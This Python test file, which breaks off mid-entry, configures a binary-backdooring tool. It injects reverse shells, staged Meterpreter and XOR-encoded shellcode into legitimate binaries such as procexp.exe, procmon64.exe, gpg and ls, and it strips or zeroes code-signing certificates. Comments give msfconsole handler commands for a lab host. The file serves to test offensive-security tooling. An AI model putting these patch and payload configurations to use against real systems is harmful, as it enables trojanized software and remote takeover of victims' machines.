#!/usr/bin/env python3

import io
import os
import sys
import logging

curdir = os.path.dirname(os.path.realpath(__file__))
prntdir = os.path.dirname(curdir)
sys.path.append(prntdir)

from pebin import pebin
from machobin import machobin
from elfbin import elfbin
from common.common import hashit

logger = logging.getLogger(__name__)


level = logging.DEBUG

logging.basicConfig(format='%(asctime)s,%(levelname)s,%(filename)s,%(message)s',
                    filename='testing.log',
                    filemode='w',
                    level=level,
                    encoding='utf-8',
                    datefmt='%Y-%m-%d %H:%M:%S')


meth_modes = {
    "jmp_entry_cave": {"PATCH_METHOD": "jmp_at_entrypoint", "MODE":
                       "cave_jumping"},
    "jmp_entry_single": {"PATCH_METHOD": "jmp_at_entrypoint", "MODE":
                         "single_cave"},
    "jmp_entry_add_section": {"PATCH_METHOD": "jmp_at_entrypoint", "MODE":
                              "add_section"},
    "onionduke": {"PATCH_METHOD": "onionduke", "TESTING": True},
    "pre_text": {"PATCH_METHOD": "pre_text_infection",
                 "MODE": "remove_signature"},
    "txt_off_ntr_splttng": {"PATCH_METHOD": "text_off_entry",
                            "MODE": "text_splitting"},
    "jmp_txt_ldr_sngl_cv": {"PATCH_METHOD": "jmp_at_entrypoint",
                            "MODE": "text_loader_single_cave"},
    "cfg_txt_ldr_sngl_cv": {"PATCH_METHOD": "hook_cfg",
                            "MODE": "cfg_loader_single_cave"},
    "cfg_txt_ldr_add_section": {"PATCH_METHOD": "hook_cfg",
                                "MODE": "cfg_loader_add_section"},
    "jmp_txt_ldr_add_section": {"PATCH_METHOD": "jmp_at_entrypoint",
                                "MODE": "text_loader_add_section"},
    "jmp_txt_ldr_payload_splitting": {"PATCH_METHOD": "jmp_at_entrypoint",
                                "MODE": "text_loader_payload_splitting"},
    "cfg_txt_ldr_payload_splitting": {"PATCH_METHOD": "hook_cfg",
                                "MODE": "cfg_loader_payload_splitting"},
    "dll_txt_ldr_sngl_cve": {"PATCH_METHOD": "hook_dll_exports",
                                      "MODE": "dll_loader_single_cave"},
    "dll_txt_ldr_add_section": {"PATCH_METHOD": "hook_dll_exports",
                                      "MODE": "dll_loader_add_section"},
    "dll_txt_ldr_payload_splitting": {"PATCH_METHOD": "hook_dll_exports",
                                      "MODE": "dll_loader_payload_splitting"},
    "cfg_dll_txt_ldr_sngl_cve": {"PATCH_METHOD": "hook_cfg",
                                      "MODE": "cfg_dll_loader_single_cave"},
    "cfg_dll_txt_ldr_add_section": {"PATCH_METHOD": "hook_cfg",
                                      "MODE": "cfg_dll_loader_add_section"},
    "cfg_dll_txt_ldr_payload_splitting": {"PATCH_METHOD": "hook_cfg",
                                      "MODE": "cfg_dll_loader_payload_splitting"},

}

payloads = {
    "iat_rvrs_tcp_nln_not_in_cave": {"PAYLOAD": "iat_reverse_tcp_inline",
                                     "IDT_IN_CAVE": False
                                     },
    "iat_rvrs_tcp_nln_in_cave": {"PAYLOAD": "iat_reverse_tcp_inline",
                                 "IDT_IN_CAVE": True
                                 },
    "rvrs_tcp_nln_sh": {"PAYLOAD": "reverse_tcp_inline_shell"
                        },
    "iat_rvrs_tcp_nln_thrdd": {"PAYLOAD":
                               "iat_reverse_tcp_inline_threaded",
                               "IDT_IN_CAVE": False
                               },
    "usr_sppld_shllcd_thrdd": {"PAYLOAD": "user_supplied_shellcode_threaded"
                               },
    "iat_usr_sppld_shllcd_thrdd": {"PAYLOAD":
                                   "iat_user_supplied_shellcode_threaded",
                                   "IDT_IN_CAVE": True
                                   },
    "iat_tcp_stgd_thrdd": {"PAYLOAD": "iat_reverse_tcp_staged_threaded",
                           "IDT_IN_CAVE": False
                           },
    "rvrs_tcp_stgd_thrdd": {"PAYLOAD": "reverse_tcp_staged_threaded"
                            },
    "mtrprtr_rvrs_https_thrdd": {"PAYLOAD":
                                 "meterpreter_reverse_https_threaded"
                                 },
    "rvrs_shll_tcp": {"PAYLOAD": "reverse_shell_tcp"
                      },
    "bcnng_rvrs_shll_tcp": {"PAYLOAD": "beaconing_reverse_shell_tcp",
                            "BEACON": "5"
                            },
    "dl_rvrs_shll_tcp": {"PAYLOAD": "delay_reverse_shell_tcp",
                         "DELAY": "5",
                         },
    "frk_rvrs_shll_tcp": {"PAYLOAD": "fork_reverse_shell_tcp",
                          },
    "frk_rvrs_shll_tcp_stgd": {"PAYLOAD": "fork_reverse_shell_tcp_staged",
                               },
    "usr_sppld_shllcd": {"PAYLOAD": "user_supplied_shellcode"
                         },
    "txt_ldr_rvrs_tcp_stgd_thrdd": {"PAYLOAD":
                                    "text_loader_reverse_tcp_staged_threaded",
                                    "IDT_IN_CAVE": False
                                    },

    "txt_usr_sppld_shllcd_thrdd": {"PAYLOAD": "text_loader_user_supplied_shellcode_threaded",
                                   "IDT_IN_CAVE": False
                                   },

    "txt_ldr_dll_rvrs_tcp_stgd_thrdd": {"PAYLOAD": "text_loader_dll_reverse_tcp_staged_threaded",
                                        "IDT_IN_CAVE": False
                                        },
    "txt_ldr_dll_usr_sppld_shllcd_thrdd": {"PAYLOAD": "text_loader_dll_user_supplied_shellcode_threaded",
                                        "IDT_IN_CAVE": False
                                        },

}

parameters = {
    'mnl_no_encoder_chng_accss_lclhst': {"HOST": "127.0.0.1", "PORT": 8080,
                                         "ENCODER": None, "MODIFIER": "manual",
                                         "TESTING": True,
                                         "CHANGE_ACCESS": True},

    'mnl_no_encoder_chng_accss': {"HOST": "172.16.64.1", "PORT": 8443,
                                  "ENCODER": None, "MODIFIER": "manual",
                                  "TESTING": True, "CHANGE_ACCESS": True},

    'mnl_usr_sppld_chng_accss': {"ENCODER": None, "MODIFIER": "manual",
                                 "TESTING": True, "CHANGE_ACCESS": True},

    'mnl_no_encoder_no_chng_accss': {"HOST": "172.16.64.1", "PORT": 9090,
                                     "ENCODER": None, "MODIFIER": "manual",
                                     "TESTING": True, "CHANGE_ACCESS": False},

    'no_encoder_lclhst': {"HOST": "127.0.0.1", "PORT": 8080,
                          "MODIFIER": "automatic",
                          "ENCODER": None},

    'mnl_xor_encoder_connect_back': {"HOST": "172.16.64.1", "PORT": 9090,
                               "MODIFIER": "manual", "TESTING": True,
                               "ENCODER": "single_byte_xor",
                               "CHANGE_ACCESS": False
                               },

    'mnl_usr_suppld_xor_encoder_lclhst': {"MODIFIER": "manual",
                                          "TESTING": True,
                                          "ENCODER": "single_byte_xor",
                                          "CHANGE_ACCESS": False
                                          },

    'mnl_usr_suppld_no_encdr_no_chng_accss_lclhst': {"MODIFIER": "manual",
                                                     "TESTING": True,
                                                     "CHANGE_ACCESS": False,
                                                     "ENCODER": None,
                                                     },

}

# name, location (disk or url), sha_256, notes
test_subjects = {
    2: ["NotepadPlusPlusPortable_7.9.5.paf.exe", "./tests/",
        "c6534d6dc164931239543c342db164edcd174ed2754b9fd240b775e80f3451cb",
        """NSIS Installer, create test for preprocess when complete""", "pe",
        {}],
    4: ["bash_adhoc", "./tests/",
        "9dc5b06c50a2566de5fc695f1d18fc2c5efb273fd4e957db68708c052f805751",
        """Legacy no execution env""", "macho",
        {}],
    6: ["bash_not_signed", "./tests/",
        "5daba6c40be028d2139d1c7246f7ea2d86adedf44daf05f7be47307ebc6a572e",
        """Legacy no execution environment""", "macho",
        {}],
    8: ["bash_x86_macho", "./tests/",
        "4632e486d2be12757aa6c052e60982cb1ebdaa74900695598189d3d690f16ba0",
        """Legacy no execution environment""", "macho",
        {}],

    12: ["hello_ET_EXEC_x86", "./tests/",
         "206535ef3be94863232d1819f318ca33f5f628999e0d2dc40118daf7de22241f",
         """ """, "elf",
         {1: [payloads["frk_rvrs_shll_tcp"] |
              meth_modes["txt_off_ntr_splttng"] |
              parameters["no_encoder_lclhst"],
              "46e27897ae9e03a3bdb60483d58d4cb913a8e42c83681d43881827a5e69139ce",
              "fork_reverse_shell_tcp"],
          # msfconsole -qx 'use exploit/multi/handler;
          # set payload linux/x86/shell/reverse_tcp; set lport 8443;
          # set lhost 172.16.64.1; set EXITFUNC thread;run'
          2: [payloads['frk_rvrs_shll_tcp_stgd'] |
              meth_modes["txt_off_ntr_splttng"] |
              parameters["mnl_no_encoder_chng_accss"],
              "1d740a03fa00aae92d74bbb884338261e370d1f9a2183c1742fda175e56ad2e6",
              "fork_reverse_shell_tcp_staged"],
          3: [{"SUPPLIED_SHELLCODE": "tests/linux_x86_127.0.0.1_8080_reverse_tcp.bin"} |
              payloads["usr_sppld_shllcd"] |
              meth_modes["txt_off_ntr_splttng"] |
              parameters["mnl_usr_sppld_chng_accss"],
              "9060180399ff8cec629f0cd86bfce5e33968fe0616156849964e7f2d59dfad9a",
              "usr_sppld_shllcd"],
          }
         ],

    14: ["hello_static_x64_ET_EXEC", "./tests/",
         "21f49f57e773b70bdc81b0468169f64cb914f96f2b8570e839c364a59ead6e72",
         """ """, "elf",
         {1: [payloads["frk_rvrs_shll_tcp"] |
              meth_modes["txt_off_ntr_splttng"] |
              parameters["no_encoder_lclhst"],
              "fe1d294454691dc4bc2d7672c34a096244ad4522e1b45f7594e8585179670b87",
              "fork_reverse_shell_tcp"],
          # msfconsole -qx 'use exploit/multi/handler;
          # set payload linux/x64/shell/reverse_tcp; set lport 8443;
          # set lhost 172.16.64.1; set EXITFUNC thread;run'
          2: [payloads['frk_rvrs_shll_tcp_stgd'] |
              meth_modes["txt_off_ntr_splttng"] |
              parameters["mnl_no_encoder_chng_accss"],
              "90d45c637d54d8ad70f718b3839fb0e8b80e2df83a1d67872ff4961fce0cc8ff",
              "fork_reverse_shell_tcp_staged"],
          3: [{"SUPPLIED_SHELLCODE": "tests/linux_x64_127.0.0.1_8080_reverse_tcp.bin"} |
              payloads["usr_sppld_shllcd"] |
              meth_modes["txt_off_ntr_splttng"] |
              parameters["mnl_usr_sppld_chng_accss"],
              "393175386ae1658d6b9fef656769270232826e51f4a89758377881840a177927",
              "usr_sppld_shllcd"],
          }],

    16: ["kali_ls_x64_ET_DYN", "./tests/",
         "430cdef8f363efe8b7fe0ce4af583b202b77d89f0ded08e3b77ac6aca0a0b304",
         """Not Supported Yet""", "elf",
         {}],

    18: ["libjli.dylib", "./tests/",
         "edea7d24e8ef05d51443a51ae3cb87de16af1ab0c7ab0a67762db345bde891b6",
         """Not Supported Yet""", "macho",
         {}],

    28: ["ls_FBSD_i386", "./tests/",
         "a4181dd5460b1f55e4248c0f70f59a8e6655bb403e70117f5dd579fafe9439f7",
         """ """, "elf",
         {1: [payloads['frk_rvrs_shll_tcp'] |
              meth_modes["txt_off_ntr_splttng"] |
              parameters["no_encoder_lclhst"],
              "d7db7e63c90f99dbd1b70a85a8d13f4dcab1f484527fa3f6cee865f3048ab833",
              "fork_reverse_shell_tcp"]},
         ],

    30: ["ls_armv7_32_raspi", "./tests/",
         "57d56e2b3e9d59a965254ffc703f47b0062ffe4c3bf603f4db3a9e0f2b81b5d5",
         """ """, "elf",
         {1: [payloads['frk_rvrs_shll_tcp'] |
              meth_modes["txt_off_ntr_splttng"] |
              parameters["no_encoder_lclhst"],
              "e03993972daeafb8aeea90d9a4fad49f9c263c91af16b4e98a8939be1c7fbeee",
              "fork_reverse_shell_tcp"]},
         ],

    31: ['gpg', './tests/',
         '7153d54e2ca9847daf266fe084fca20ecd35eff57edc55bf961b96a149c22d8a',
         """This file is gpg2 and must be run out of /usr/local/bin/gpg,
         check the simlink,
         it's a universal file, which is why it's being included.
         """,
         'macho',
         {1: [{"FAT_PRIORITY": "x64"
               } | meth_modes["pre_text"] |
              payloads["rvrs_shll_tcp"] |
              parameters["no_encoder_lclhst"],
              "1bf9799ae65bbc9a1857578500b7063feb27e968fdd9e0a6e2ea6a3568a23e34",
              "reverse shell localhost macho x64"],
          2: [{"FAT_PRIORITY": "x64"
               } | meth_modes["pre_text"] |
              payloads["dl_rvrs_shll_tcp"] |
              parameters["no_encoder_lclhst"],
              "ba4c4f71bb854786494f8ece741ce4f8ad689c26a6a4c2835fb13953562a4e7f",
              "delay_reverse_shell_tcp"
              ],
          3: [{"FAT_PRIORITY": "x64"
               } | meth_modes["pre_text"] |
              payloads["bcnng_rvrs_shll_tcp"] |
              parameters["no_encoder_lclhst"],
              "92f7e85a4001ba630a7944dd0b21352ee621b4f52265d66dbe5b11dee3e31224",
              "beaconing_reverse_shell_tcp"
              ],
          },
         ],

    32: ["macho_ls_x64", "./tests/",
         "43969ad2a7eaf877f6852423f6ad803d7d89183ac152983d8d71e34d91c78079",
         """ """, "macho",
         # test_number: [FORMAT: ARGS], test_bash, test_name
         {1: [{"FAT_PRIORITY": "x64"
               } | meth_modes["pre_text"] |
              payloads["rvrs_shll_tcp"] |
              parameters["no_encoder_lclhst"],
              "6884114da8a81f0e6676fdfe40e119051eac76511382970eed857a9692a4e8e8",
              "reverse shell localhost macho x64"],
          2: [{"FAT_PRIORITY": "x64"
               } | meth_modes["pre_text"] |
              payloads["dl_rvrs_shll_tcp"] |
              parameters["no_encoder_lclhst"],
              "32fb705260b493f4609602a602fecde71ad59a1b96fb7c57c8cc031fd858b7a4",
              "delay_reverse_shell_tcp"
              ],
          3: [{"FAT_PRIORITY": "x64"
               } | meth_modes["pre_text"] |
              payloads["bcnng_rvrs_shll_tcp"] |
              parameters["no_encoder_lclhst"],
              "9b2a2fe2dd5286fea068f3f89facd7e99fef605d2079f84fcd6b52cb5aa340dc",
              "beaconing_reverse_shell_tcp"
              ],
              # TODO user_supplied_shellcode 
          },
         ],

    33: ["binA_aarch64_m1", "./tests/",
         "c5f831dcb5ce29e312c90435ea06884d28b68d90fe7bc7bf2bf6cb1110edba0a",
         """hello world aarch_m1""", "macho",
         {1: [{"FAT_PRIORITY": "arm64e"
               } | meth_modes["pre_text"] |
              payloads["rvrs_shll_tcp"] |
              parameters["no_encoder_lclhst"],
              "860f0249c2445f8ba92b372d642ed9f50ae55d76f565d54a6cc1e23dbeb00ba1",
              "reverse shell localhost macho arm64e"],
          2: [{"FAT_PRIORITY": "arm64e"
               } | meth_modes["pre_text"] |
              payloads["dl_rvrs_shll_tcp"] |
              parameters["no_encoder_lclhst"],
              "fbcee9ea9f6de083279554aa874fe3b14db1705ceda5034b5743c83fdeec421e",
              "delay_reverse_shell_tcp arm64e"
              ],
          3: [{"FAT_PRIORITY": "arm64e"
               } | meth_modes["pre_text"] |
              payloads["bcnng_rvrs_shll_tcp"] |
              parameters["no_encoder_lclhst"],
              "796a96da3ac4aa6a294474c734e22926ae91281403aeedec29f9d0272f2cec5f",
              "beaconing_reverse_shell_tcp arm64e"
              ],
              # TODO user_supplied_shellcode 
          }
         ],

    34: ["procexp.exe", "./tests/",
         "6470116b78b88a3062225d66a7a6040c507b9c5094550e33aece520bfb88ab57",
         """ """, "pe",
         # test_number: [FORMAT: ARGS], test_bash, test_name
         {'1': [{"ZERO_CERT": True,
                 "TESTING_CAVES": "558,512,136",
                 "CHECKSUM": True,
                 } |
                meth_modes['jmp_entry_cave'] |
                payloads['iat_rvrs_tcp_nln_not_in_cave'] |
                parameters['mnl_no_encoder_chng_accss_lclhst'],
                "1ada7c194f617a4130b3bd9500712318d4af38eab1fbfffeff7a2d7b9baaba70",
                "reverse_caves iat_rvrs_tcp_nln_idt_not_in_cave"],

          '2': [{"ZERO_CERT": True} |
                payloads['rvrs_tcp_nln_sh'] |
                meth_modes['jmp_entry_add_section'] |
                parameters['mnl_no_encoder_chng_accss_lclhst'],
                "5932b76077f87d3fbb13e15ea984ed1f2d4232b43bdfc0e7670c6e64010799ff",
                "reverse_tcp_inline_shell"],

          '3': [{"ZERO_CERT": True,
                "TESTING_CAVES": "585,608,844"} |
                meth_modes['jmp_entry_cave'] |
                payloads['iat_rvrs_tcp_nln_in_cave'] |
                parameters['mnl_no_encoder_chng_accss_lclhst'],
                "776465806c684d83dba6ba22afc3c7c0bcd333d8e7ea9ee6755589e736a53037",
                "forward_caves iat_rvrs_tcp_nln idt_iat_in_cave"],

          '4': [{"ZERO_CERT": False,
                 "TESTING_CAVES": "685,647,700",
                 "SUPPLIED_SHELLCODE":
                 "./tests/localhost_8080_reverse_shell_tcp.bin"} |
                meth_modes['jmp_entry_cave'] |
                payloads['usr_sppld_shllcd_thrdd'] |
                parameters['mnl_usr_sppld_chng_accss'],
                "ae8a9a86eb5af1e1451b80e9faaa8172422cd4be712c5b6e2bdb8f29479a4387",
                "user_supplied_shellcode_threaded jmp_entry_cave \
                 high_low_high"],

          '5': [{"ZERO_CERT": True,
                 "TESTING_CAVES": "16",
                 "SUPPLIED_SHELLCODE":
                 "./tests/localhost_8080_reverse_shell_tcp.bin"
                 } |
                meth_modes['jmp_entry_single'] |
                payloads['iat_usr_sppld_shllcd_thrdd'] |
                parameters['mnl_usr_sppld_chng_accss'],
                "0fff73044988ae474bff2d1d02238326fd54d0d77ac9b714933adc71808191ba",
                "iat_usr_sppld_shllcd_thrdd jmp_single_cave"],

          '6': [{"ZERO_CERT": False,
                 "TESTING_CAVES": "23",
                 } |
                meth_modes['jmp_entry_single'] |
                payloads['iat_tcp_stgd_thrdd'] |
                parameters['mnl_no_encoder_chng_accss'],
                # on host: msfconsole -qx 'use exploit/multi/handler; set
                # payload windows/meterpreter/reverse_tcp; set lport 8443;set
                # lhost 172.16.64.1; set EXITFUNC thread; run'
                "57ebb64b48bfd3a54866e7514654033985a4bc66bf5ee88670a4595a58a84767",
                "iat_tcp_stgd_thrdd"],

          '7': [{"ZERO_CERT": True,
                 } |
                meth_modes['jmp_entry_add_section'] |
                payloads['rvrs_tcp_stgd_thrdd'] |
                parameters['mnl_no_encoder_chng_accss'],
                # on host: msfconsole -qx 'use exploit/multi/handler; set
                # payload windows/meterpreter/reverse_tcp; set lport 8443;set
                # lhost 172.16.64.1; set EXITFUNC thread; run'
                "61e877502f84dc518560a1974804e9a62e9d1d64dc0704da73287d236b7d881c",
                "rvrs_tcp_stgd_thrdd code_signing_test"],

          '8': [{"ZERO_CERT": True,
                 } |
                meth_modes['jmp_entry_add_section'] |
                payloads['mtrprtr_rvrs_https_thrdd'] |
                parameters['mnl_no_encoder_chng_accss'],
                # on host: msfconsole -qx 'use exploit/multi/handler; set
                # payload windows/meterpreter/reverse_https; set lport 8443;
                # set lhost 172.16.64.1; set EXITFUNC thread;run'
                "7d5bfcd25c22d901ff9effb1837b8719fd28198cf2245e09adece20c2f82165e",
                "mtrprtr_rvrs_https_thrdd"],

          '9': [{"ZERO_CERT": True,
                 } |
                meth_modes['jmp_entry_add_section'] |
                payloads['iat_rvrs_tcp_nln_thrdd'] |
                parameters['mnl_no_encoder_chng_accss_lclhst'],
                "162d42470366e10109332d1e83df2022fcb7f29792c43f9f67847f9f95a68385",
                "mtrprtr_rvrs_https_thrdd"],

          '10': [{"ZERO_CERT": True,
                  "SUPPLIED_BINARY":
                  "tests/localhost_8080_x86_reverse_shell_tcp.exe",
                  "CHECKSUM": True} |
                 meth_modes['onionduke'],
                 "db58c5a3ca77b7d0c19dc45b7a11ec50cad8385db9892a30743cbbbc64ae4adb",
                 "od_exe_x86"],

          '11': [{"ZERO_CERT": True,
                  "SUPPLIED_BINARY":
                  "tests/localhost_8080_x86_reverse_shell_tcp.dll",
                  "CHECKSUM": True} |
                 meth_modes['onionduke'],
                 "aee11b11be6c9c75fc624b0c30d15946a4862f43f99156e82289cd24ae4e3e66",
                 "od_dll_x86"],

          '12': [{"ZERO_CERT": True,
                  "SUPPLIED_BINARY":
                  "tests/localhost_8080_x64_reverse_shell_tcp.exe",
                  "CHECKSUM": True} |
                 meth_modes['onionduke'],
                 "81f0a84de1a2e42c978fec18cb54c3ad5c0822a7dbb2f67f193de8633164437a",
                 "od_exe_x64"],

          '13': [{"ZERO_CERT": True,
                  "SUPPLIED_BINARY":
                  "tests/localhost_8080_x64_reverse_shell_tcp.dll",
                  "CHECKSUM": True} |
                 meth_modes['onionduke'],
                 "44b165552d958615a02292bc6fcb9d776bb497fb285b4cb39cdfb5e1e44084e7",
                 "od_dll_x64"],

          }
         ],

    38: ["procmon64.exe", "./tests/",
         "e58778cdb820cec14681bd7b1f1f74403dd1c1c0335b00d7f79b0b12f39e7421",
         """ """, "pe",
         {'1': [{"ZERO_CERT": True,
                 "TESTING_CAVES": "217,201,184",
                 "CHECKSUM": True,
                 } |
                meth_modes['jmp_entry_cave'] |
                payloads['iat_rvrs_tcp_nln_not_in_cave'] |
                parameters['mnl_no_encoder_chng_accss_lclhst'],
                "d208c723fb47b7142a08abdad4b1b12e3fbc6da8041c2ef237ffeb2f218ff2fc",
                "reverse_caves iat_rvrs_tcp_nln_idt_not_in_cave"],

          '2': [{"ZERO_CERT": True} |
                payloads['rvrs_tcp_nln_sh'] |
                meth_modes['jmp_entry_add_section'] |
                parameters['mnl_no_encoder_chng_accss_lclhst'],
                "b22927b4a0be9904dada22885a4b275df3298fd1687145893d4102dd524ca30a",
                "reverse_tcp_inline_shell"],

          '3': [{"ZERO_CERT": True,
                "TESTING_CAVES": "201,206,217"
                 } |
                meth_modes['jmp_entry_cave'] |
                payloads['iat_rvrs_tcp_nln_in_cave'] |
                parameters['mnl_no_encoder_chng_accss_lclhst'],
                "26ba69fec24febae82ac69f3a86a9346069dd1b98496803e74b7aa4a0178564c",
                "forward_caves iat_rvrs_tcp_nln idt_iat_in_cave"],

          '4': [{"ZERO_CERT": False,
                 "TESTING_CAVES": "189,186,173",
                 "SUPPLIED_SHELLCODE":
                 "./tests/localhost_8080_x64_reverse_shell_tcp.bin"} |
                meth_modes['jmp_entry_cave'] |
                payloads['usr_sppld_shllcd_thrdd'] |
                parameters['mnl_usr_sppld_chng_accss'],
                "642a871c6a9aec3a9020729a2f93aff19f649a1f2cde8b7d3461b877308feb9f",
                "user_supplied_shellcode_threaded jmp_entry_cave \
                 high_low_high"],

          '5': [{"ZERO_CERT": True,
                 "TESTING_CAVES": "1",
                 "SUPPLIED_SHELLCODE":
                 "./tests/localhost_8080_x64_reverse_shell_tcp.bin"
                 } |
                meth_modes['jmp_entry_single'] |
                payloads['iat_usr_sppld_shllcd_thrdd'] |
                parameters['mnl_usr_sppld_chng_accss'],
                "12c7f83a8760a9b7a0573d57dafdf7dbf11303c11ee9c96a48f2e5c5701c80f1",
                "iat_usr_sppld_shllcd_thrdd jmp_single_cave"],

          '6': [{"ZERO_CERT": False,
                 "TESTING_CAVES": "1",
                 } |
                meth_modes['jmp_entry_single'] |
                payloads['iat_tcp_stgd_thrdd'] |
                parameters['mnl_no_encoder_chng_accss'],
                # on host: msfconsole -qx 'use exploit/multi/handler; set
                # payload windows/x64/meterpreter/reverse_tcp; set lport 8443;set
                # lhost 172.16.64.1; set EXITFUNC thread; run'
                "50a7eb1f2b4cffe2cb1227789260019d178263c3d2da6c5e29bc843d37185d7d",
                "iat_tcp_stgd_thrdd"],

          '7': [{"ZERO_CERT": True,
                 } |
                meth_modes['jmp_entry_add_section'] |
                payloads['rvrs_tcp_stgd_thrdd'] |
                parameters['mnl_no_encoder_chng_accss'],
                # on host: msfconsole -qx 'use exploit/multi/handler; set
                # payload windows/x64/meterpreter/reverse_tcp; set lport 8443;set
                # lhost 172.16.64.1; set EXITFUNC thread; run'
                "3fb6de9676e53468ff9791c00543bd2328e3873a1a5e0bd7c7d640944a968934",
                "rvrs_tcp_stgd_thrdd code_signing_test"],

          '8': [{"ZERO_CERT": True,
                 } |
                meth_modes['jmp_entry_add_section'] |
                payloads['mtrprtr_rvrs_https_thrdd'] |
                parameters['mnl_no_encoder_chng_accss'],
                "52663e2ed216b31592976dd10faa6a8c905ae693239fb2977adc30bf837cc559",
                "mtrprtr_rvrs_https_thrdd"],

          '9': [{"ZERO_CERT": True,
                 } |
                meth_modes['jmp_entry_add_section'] |
                payloads['iat_rvrs_tcp_nln_thrdd'] |
                parameters['mnl_no_encoder_chng_accss_lclhst'],
                "c469a4eeb226319eafb0bb9b3576ce78e85085e6c281a60111ab9ce651737773",
                "mtrprtr_rvrs_https_thrdd"],

          '10': [{"ZERO_CERT": True,
                  "SUPPLIED_BINARY":
                  "tests/localhost_8080_x86_reverse_shell_tcp.exe",
                  "CHECKSUM": True} |
                 meth_modes['onionduke'],
                 "8d02853cbaa997e8ad14b10e0441efe1e5770951a284cd4bf88506d9a5e7a278",
                 "od_exe_x86"],

          '11': [{"ZERO_CERT": True,
                  "SUPPLIED_BINARY":
                  "tests/localhost_8080_x86_reverse_shell_tcp.dll",
                  "CHECKSUM": True} |
                 meth_modes['onionduke'],
                 "fa0f4c6f8ba7ad36c704ed739f081c928cb6899dd8929bf9fbc1c8285da64b61",
                 "od_dll_x86"],

          '12': [{"ZERO_CERT": True,
                  "SUPPLIED_BINARY":
                  "tests/localhost_8080_x64_reverse_shell_tcp.exe",
                  "CHECKSUM": True} |
                 meth_modes['onionduke'],
                 "9a03dd60dbcc8baf538f1b2e28748b35f156ebe74e5fe2e791911e9efae5eed5",
                 "od_exe_x64"],

          '13': [{"ZERO_CERT": True,
                  "SUPPLIED_BINARY":
                  "tests/localhost_8080_x64_reverse_shell_tcp.dll",
                  "CHECKSUM": True} |
                 meth_modes['onionduke'],
                 "a06024ab3b5fe10b76e2d4379fcae2886b8b79f55db480fc3a465686e8827c89",
                 "od_dll_x64"],

          '14': [{"ZERO_CERT": True,
                  "TESTING_CAVES": "2",
                  "CHECKSUM": True,
                  } |
                 meth_modes['jmp_txt_ldr_sngl_cv'] |
                 payloads['txt_ldr_rvrs_tcp_stgd_thrdd'] |
                 parameters['mnl_no_encoder_no_chng_accss'],
                 "7506a72d7121b45393d0b0e41e1708b929926acf6b1f2406a0e98576e3966ad7",
                 "text_loader_test"],

          '15': [{"ZERO_CERT": True,
                  "TESTING_CAVES": "3",
                  "CHECKSUM": True,
                  } |
                 meth_modes['cfg_txt_ldr_sngl_cv'] |
                 payloads['txt_ldr_rvrs_tcp_stgd_thrdd'] |
                 parameters['mnl_no_encoder_no_chng_accss'],
                 "0fc9b077dd9fbca10d54e27d214b24f59647bb709cdc5f007c20314784d0f671",
                 "cfg_w_text_loader_test"],

          '16': [{"ZERO_CERT": True,
                  "TESTING_CAVES": "2",
                  "CHECKSUM": True,
                  } |
                 meth_modes["jmp_txt_ldr_sngl_cv"] |
                 payloads["txt_ldr_rvrs_tcp_stgd_thrdd"] |
                 parameters["mnl_xor_encoder_connect_back"],
                 "f1ab03f2bfc093c0ad0724c35999d6242ffed0ef4facf80076280e92f1dd6985",
                 "text_loader_test_xor_encoder_test",
                 ],

          '17': [{"ZERO_CERT": True,
                  "TESTING_CAVES": "2",
                  "CHECKSUM": True,
                  } |
                 meth_modes["cfg_txt_ldr_sngl_cv"] |
                 payloads["txt_ldr_rvrs_tcp_stgd_thrdd"] |
                 parameters["mnl_xor_encoder_connect_back"],
                 "5c84de8f899ac0bf747a5637069cfb9e5ff57aac2ad7a6042623043bc1e327c4",
                 "cfg_w_txt_loader_test_xor_encoder_test",
                 ],

          '18': [{"ZERO_CERT": False,
                  "TESTING_CAVES": "2",
                  "SUPPLIED_SHELLCODE":
                  "./tests/localhost_8080_x64_reverse_shell_tcp.bin"} |
                 meth_modes['jmp_txt_ldr_sngl_cv'] |
                 payloads['txt_usr_sppld_shllcd_thrdd'] |
                 parameters['mnl_usr_suppld_xor_encoder_lclhst'],
                 "22823d46878c1ad7b3788ed787d0e28ac88c6d089180c60ceaf1f86d6d1148c4",
                 "txt_loader_supplied_shellcode_threaded xor_encoder jmp_entry_cave"],

          '19': [{"ZERO_CERT": False,
                  "TESTING_CAVES": "2",
                  "SUPPLIED_SHELLCODE":
                  "./tests/localhost_8080_x64_reverse_shell_tcp.bin"} |
                 meth_modes['cfg_txt_ldr_sngl_cv'] |
                 payloads['txt_usr_sppld_shllcd_thrdd'] |
                 parameters['mnl_usr_suppld_xor_encoder_lclhst'],
                 "d3e204ffd8ac010d85b9f15e175cb070ae19ecaf3ccd964f960cf23e3ddc1e3d",
                 "txt_loader_supplied_shellcode_threaded xor_encoder hook_cfg"],

          '20': [{"ZERO_CERT": False,
                  "TESTING_CAVES": "2",
                  "SUPPLIED_SHELLCODE":
                  "./tests/localhost_8080_x64_reverse_shell_tcp.bin"} |
                 meth_modes['jmp_txt_ldr_sngl_cv'] |
                 payloads['txt_usr_sppld_shllcd_thrdd'] |
                 parameters['mnl_usr_suppld_no_encdr_no_chng_accss_lclhst'],
                 "c2de0294261234e071bab0030d8560f97d6078c83f0fa123d405dce3f4ac1869",
                 "txt_loader_supplied_shellcode_threaded no_encoder jmp_entry_cave"],

          '21': [{"ZERO_CERT": False,
                  "TESTING_CAVES": "2",
                  "SUPPLIED_SHELLCODE":
                  "./tests/localhost_8080_x64_reverse_shell_tcp.bin"} |
                 meth_modes['cfg_txt_ldr_sngl_cv'] |
                 payloads['txt_usr_sppld_shllcd_thrdd'] |
                 parameters['mnl_usr_suppld_no_encdr_no_chng_accss_lclhst'],
                 "f75874a8000b1d7dec3d5b0f828822204705c11a4ad0074f1c1a2cb866b98175",
                 "txt_loader_supplied_shellcode_threaded no_encoder hook_cfg"],

          '22': [{"ZERO_CERT": True,
                  "CHECKSUM": True} |
                 meth_modes["cfg_txt_ldr_add_section"] |
                 payloads["txt_ldr_rvrs_tcp_stgd_thrdd"] |
                 parameters["mnl_xor_encoder_connect_back"],
                 "c173019de997e036d7d2a5b9207fb1cb4c3c2af3c34ed4378bcf2f196f418e9b",
                 "txt_loader_rvrs_threaded add_section xor_encoder hook_cfg"],

          '23': [{"ZERO_CERT": True,
                  "CHECKSUM": True} |
                 meth_modes["jmp_txt_ldr_add_section"] |
                 payloads["txt_ldr_rvrs_tcp_stgd_thrdd"] |
                 parameters["mnl_xor_encoder_connect_back"],
                 "662b31d13940caf4c82637022024befa54c09809ab7ffbd6676e07ab90c7d57f",
                 "txt_loader_rvrs_threaded add_section xor_encoder jmp_entry"],

          '24': [{"ZERO_CERT": True,
                  "NUMBER_OF_CAVES": 4,
